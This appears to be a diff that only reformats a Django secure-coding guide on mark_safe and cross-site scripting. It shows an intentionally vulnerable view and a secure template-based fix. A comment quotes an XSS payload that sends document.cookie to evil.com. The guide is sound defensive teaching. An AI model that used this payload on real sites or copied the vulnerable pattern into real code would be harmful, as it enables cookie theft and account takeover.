@@ -16,8 +16,9 @@ If `mark_safe` is used on a string that contains untrusted user input, it effect
 from django.http import HttpResponse
 from django.utils.safestring import mark_safe
 
+
 def user_profile(request):
-    user_input = request.GET.get('name', '')
+    user_input = request.GET.get("name", "")
 
     # This is vulnerable. The user's input is being marked as safe.
     # An attacker can provide a name like: <script>document.location='http://evil.com/?c='+document.cookie</script>
@@ -34,13 +35,14 @@ The best practice is to avoid `mark_safe` and rely on Django's templating system
 ```python
 from django.shortcuts import render
 
+
 def user_profile(request):
-    user_input = request.GET.get('name', '')
+    user_input = request.GET.get("name", "")
 
     # Pass the raw data to the template.
     # The template will handle the HTML structure and escaping.
-    context = {'user_name': user_input}
-    return render(request, 'user_profile.html', context)
+    context = {"user_name": user_input}
+    return render(request, "user_profile.html", context)
 ```
 
 **`user_profile.html` template:**
